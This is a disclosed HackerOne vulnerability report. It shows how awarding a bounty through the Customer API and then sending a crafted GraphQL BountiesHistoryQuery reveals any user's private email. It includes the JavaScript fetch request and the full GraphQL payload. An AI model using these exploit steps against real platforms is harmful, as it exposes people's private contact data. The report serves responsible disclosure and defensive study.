# Creation of bounties through Customer API leads to private email disclosure

## Report Details
- **Report ID**: 2382120
- **URL**: https://hackerone.com/reports/2382120
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2024-02-20T16:22:43.419Z
- **Disclosed**: 2024-03-26T13:10:59.472Z

## Reporter
- **Username**: kimingi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**
Hello team,
It is possible to reveal any user email using the `BountiesHistoryQuery` request.
To demonstrate this, I will make use of both the API and the graphql requests.

### Steps To Reproduce

1. Log in to your account and create a demo
2. Head over to https://hackerone.com/organizations/████/settings/api_tokens and create a token with the report manager role
3. Head over to any profile of a user in hackerone and copy their user id
4. Use this request below to award a program bounty to that user using the API. `recipient_id` is the id of any user and `{id}` is your sandbox program id.
```
let inputBody = "{\n  \"data\": {\n    \"type\": \"bounty\",\n    \"attributes\": {\n      \"recipient_id\": \"██████████\",\n          \"amount\": 51,\n      \"reference\": \"newbounty\",\n      \"title\": \"BOUNTY FROM Sandbox\",\n      \"currency\": \"USD\",\n      \"severity_rating\": \"high\"\n    }\n  }\n}";
let user = 'identifier';
let password = 'token';
let headers = new Headers();
headers.set('Authorization', 'Basic ' + btoa(user + ":" + password));
  headers.set('Content-Type', 'application/json');  headers.set('Accept', 'application/json');

fetch('https://api.hackerone.com/v1/programs/{id}/bounties',
{
  method: 'POST',
  body: inputBody,
  headers: headers
})
.then(function(res) {
    return res.json();
}).then(function(body) {
    console.log(body);
});

```
5. You will get a success message

██████
6. After awarding the bounty, make the following Graphql request. Where `handle` is the handle of your sandbox team
```
{"operationName":"BountiesHistoryQuery","variables":{"handle":"████","pageSize":25,"product_area":"other","product_feature":"other"},"query":"query BountiesHistoryQuery($handle: String!, $pageSize: Int!, $cursor: String) {\n  team(handle: $handle) {\n    id\n    currency\n    offers_bounties\n    state\n    bounties(first: $pageSize, after: $cursor) {\n   pageInfo {\n        endCursor\n        hasNextPage\n        __typename\n      }\n         edges {\n          node {\n          id\n    awarded_user{username} invitations{email token}     awarded_amount\n          awarded_bonus_amount\n          created_at\n          report {\n            id\n            database_id: _id\n            reporter {\n     email          id\n              username\n              __typename\n            }\n            title\n            __typename\n          }\n          total_awarded_amount\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}
```
7. Notice the email of the user is shown in the response

█████████

## Impact

Reveal any user email

## Attachments
No attachments
